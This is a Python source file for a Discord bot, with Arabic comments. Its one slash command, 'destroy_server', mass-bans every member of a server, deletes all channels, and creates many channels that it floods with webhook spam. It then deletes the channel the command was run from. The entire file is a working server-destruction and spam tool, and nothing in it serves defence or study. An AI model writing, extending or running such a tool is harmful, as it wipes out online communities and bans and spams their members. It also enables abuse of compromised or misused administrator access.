import os
import asyncio
import discord
from discord import app_commands
from discord.ext import commands


class MyBot(commands.Bot):

    def __init__(self):
        intents = discord.Intents.default()
        intents.guilds = True
        intents.guild_messages = True
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("تم مزامنة أوامر السلاش بنجاح.")


bot = MyBot()


@bot.event
async def on_ready():
    print(f"تم تسجيل الدخول باسم: {bot.user}")


# دالة إرسال السبام للويب هوك بسرعة عالية
async def send_webhook_spams(
    webhook: discord.Webhook, message: str, count: int
):
    tasks = [webhook.send(content=message) for _ in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.tree.command(
    name="destroy_server",
    description="أمر تدمير السيرفر السريع بدون أرقام في أسماء الرومات",
)
@app_commands.describe(
    room_name="اسم الرومات الجديدة (بدون أرقام)",
    rooms_count="عدد الرومات المراد إنشاؤها",
    webhook_name="اسم الويب هوك",
    message_content="محتوى رسالة السبام",
    messages_count="عدد الرسائل في كل روم",
)
async def destroy_server(
    interaction: discord.Interaction,
    room_name: str,
    rooms_count: int,
    webhook_name: str,
    message_content: str,
    messages_count: int,
):
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message(
            "يجب أن تكون مشرفاً لاستخدام هذا الأمر.", ephemeral=True
        )
        return

    await interaction.response.send_message(
        "جاري التنفيذ السريع...", ephemeral=True
    )
    guild = interaction.guild

    # 1. حظر الأعضاء دفعة واحدة
    async def ban_member(member):
        if member.id == bot.user.id or member.id == interaction.user.id:
            return
        try:
            await guild.ban(member, reason="تدمير السيرفر")
        except Exception as e:
            print(f"فشل حظر {member.name}: {e}")

    ban_tasks = [ban_member(m) for m in guild.members]

    # 2. حذف الرومات القديمة دفعة واحدة (باستثناء روم الأمر)
    async def delete_channel(channel):
        if channel.id == interaction.channel.id:
            return
        try:
            await channel.delete()
        except Exception as e:
            print(f"فشل حذف الروم {channel.name}: {e}")

    delete_tasks = [delete_channel(c) for c in guild.channels]

    # 3. إنشاء الرومات والويب هوكات والسبام دفعة واحدة بدون أرقام
    category = interaction.channel.category

    async def create_and_spam(i):
        try:
            # استخدام الاسم المباشر بدون إضافة رقم تسلسلي (ملاحظة: ديسكورد قد يدمج الأسماء المتطابقة لو كانت في نفس الكاتجوري تماماً، لكنها ستنشأ بالاسم الذي طلبتَه)
            name = room_name
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(
                    send_messages=True, view_channel=True
                )
            }
            if category:
                channel = await guild.create_text_channel(
                    name, category=category, overwrites=overwrites
                )
            else:
                channel = await guild.create_text_channel(name, overwrites=overwrites)

            # إنشاء الويب هوك بالاسم المباشر بدون أرقام
            webhook = await channel.create_webhook(name=webhook_name)
            await send_webhook_spams(webhook, message_content, messages_count)
        except Exception as e:
            print(f"خطأ في إنشاء الروم: {e}")

    create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]

    # إطلاق العمليات كلها مع بعض بشكل متزامن
    await asyncio.gather(
        asyncio.gather(*ban_tasks, return_exceptions=True),
        asyncio.gather(*delete_tasks, return_exceptions=True),
        asyncio.gather(*create_tasks, return_exceptions=True),
        return_exceptions=True,
    )

    # حذف الروم الحالي بالآخر
    try:
        await interaction.channel.delete()
    except:
        pass


MASTERGUARD_TOKEN = os.environ.get('MASTERGUARD_TOKEN')
bot.run(MASTERGUARD_TOKEN)
